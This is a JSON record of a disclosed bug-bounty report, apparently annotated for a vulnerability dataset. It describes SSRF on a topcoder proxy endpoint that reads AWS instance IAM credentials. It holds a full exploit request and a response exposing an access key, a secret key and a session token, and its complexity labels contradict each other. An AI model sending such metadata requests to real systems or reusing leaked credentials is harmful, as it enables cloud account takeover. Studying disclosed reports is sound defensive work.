{
    "reported_to": "Lab45",
    "reported_by": "zhh ",
    "title": "SSRF to AWS file read",
    "content": "\nSummary:\nafter seeing the disclosure it looks like the bug was not fixed properly\nSteps To Reproduce:\ncopy and paste the request below and paste it into Burpsuite repeater\nGET /community-app-assets/api/proxy-post?url=http%3A%2F%2F169.254.169.254%2F/latest/meta-data/iam/security-credentials/ecsInstanceRole%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1 Host: cognitive.topcoder.com Content-Length: 108 Authorization: ApiKey 130edef6-2289-4407-bfcf-3eedacebb860 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept: */* Origin: http://cognitive.topcoder.com Referer: http://cognitive.topcoder.com/ibm-cloud Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9\nb_65bd5a1857b73643aad556093_934e9ffdc5=&EMAIL=eviltwin%404w15ul5vh79meeab3xqz2jk45vbpze.burpcollaborator.net\nResponse\nHTTP/1.1 200 OK Date: Fri, 11 Sep 2020 01:28:12 GMT Content-Type: text/html; charset=utf-8 Connection: keep-alive Set-Cookie: AWSALB=aSpYpAdScSiCogY5VQi4XHhFWnu3JHIrxMXl5tMUe/tkJvgoS7oE/ss8jqxWakYo2YgARf7QZsQGKzAP40hOG0W3WA/IugU/FFGaQkZ2LXjrPk2hoP8fxJiVxycf; Expires=Fri, 18 Sep 2020 01:28:12 GMT; Path=/ Set-Cookie: AWSALBCORS=aSpYpAdScSiCogY5VQi4XHhFWnu3JHIrxMXl5tMUe/tkJvgoS7oE/ss8jqxWakYo2YgARf7QZsQGKzAP40hOG0W3WA/IugU/FFGaQkZ2LXjrPk2hoP8fxJiVxycf; Expires=Fri, 18 Sep 2020 01:28:12 GMT; Path=/; SameSite=None X-DNS-Prefetch-Control: off X-Frame-Options: SAMEORIGIN Strict-Transport-Security: max-age=15552000; includeSubDomains X-Download-Options: noopen X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block ETag: W/\"512-LkSYc5PU5Y4xWGPxqoM8orPaKK0\" Vary: Accept-Encoding Content-Length: 1298\n{ \"Code\" : \"Success\", \"LastUpdated\" : \"2020-09-11T00:36:00Z\", \"Type\" : \"AWS-HMAC\", \"AccessKeyId\" : \"ASIAV6SVWBIPVJNDI4LO\", \"SecretAccessKey\" : \"wAwYDQcsfEMUyku//RxXI/NjdAMUtRLj4cfSiEVQ\", \"Token\" : \"IQoJb3JpZ2luX2VjEGEaCXVzLWVhc3QtMSJIMEYCIQD8srpZ/87c2HrLYddytORezee2NMx0/PWk4UH+2nahPgIhAOwlCmFgVAcdsUBpbDHI6McTLQcHlUnA/FAMOf5GoMWmKrQDCGoQABoMNDA5Mjc1MzM3MjQ3Igw+zvAcQIYJijsNTWsqkQMfVMu7kgOepBvF96NdZHk4KxICWOBDlrJN/MR9o3Hf6Ohst+4d/tbGeyCL7xClsepu+02nf/sX7Ggtx9ciqAg14OmsUWjzp4ZHntge0oi9AJpfyc76UVFNFdTwbo/hEEHKfjgC18lFW+E5DIP00Ifm7usFgLLABozP9Av/hJLwCWG7UHfnHicvc0eY9Tscc+RS4U0GWvUGGXji1vm/8ud5c7Ou6h2z2fo9fSODgq/c1sZReVtofuhSYOfpYtr4ByrHMVY78aR+VrF//6870MUJWNOI4EK3NFxtPH6HCJRmBwh3iVTqYI+vawove6BG3PmMkeyBZSqCqFCTuf+H/eEdw6orjNQ7BxurtB8ZaymaUABhNKfQTBeDBy8/G/wK75v7YZjPUmalMf89wGvshp5EHQVYySr3RGlS9Ti5FbIzR0Gl+5cLx/0AX6ce8L5UrXACpOLktOJe+l/W1KQchNOs9MEwSTYi+sa1qITd17XS9tp0BuRlZSX4MGQ0SJvDEmNvQq84avF4SLbqJLNZEVn0uDCkjev6BTrqAb5BqJ09VpgjlBloe0SAGp4uNlWheqWl+Vt3S+jcVRqf4LNAM3hbEvRB6pTt9itSE6l4y40QADcmMs0oWc6sm+oCG5enAkRxQBFYFDt+OvbxnSnQmaG3YDuRRJwpsaMA/V0TLqpQq5wvJMOssylXffenYIFpVIbZ5BQ5elDVqVpol/1fe+ej3slNvG6VqD3/OwLyNPjfAhdG3UmYzqyr3ym6uywn0KmLMY9esM7Mde5KA2LmgozCKpkV18u0LGCORGXGnllCWpuifVMYXoLQJgk8LCB5H6FbBbcqVvE5FGabClXZG3UIbhPsfg==\", \"Expiration\" : \"2020-09-11T06:47:23Z\" }\nSupporting Material/References:\nvideo PoC: bandicam_2020-09-11_01-28-03-986.avi (F983368)\nImpact\naws file read\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": null,
    "weaknesses": [
        "Server-Side Request Forgery (SSRF)"
    ],
    "screenshots": {},
    "disclosed_date": 1631845800,
    "report_url": "https://hackerone.com/reports/978823",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "API",
    "steps": [
        [
            1,
            "Copy and paste the provided request into Burpsuite repeater."
        ],
        [
            2,
            "Send the request to the vulnerable endpoint to retrieve AWS metadata including IAM credentials."
        ]
    ],
    "vuln_description": "This vulnerability is a Server-Side Request Forgery (SSRF) that allows an attacker to read AWS metadata, specifically IAM security credentials, from the internal metadata service (169.254.169.254). This can lead to unauthorized access to AWS resources.",
    "reason": "The attack involves a straightforward SSRF to a well-known AWS metadata endpoint. The complexity is low because it does not require multiple components, subtle interactions, or complex application state manipulation. The AWS metadata endpoint is a common target for SSRF attacks.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}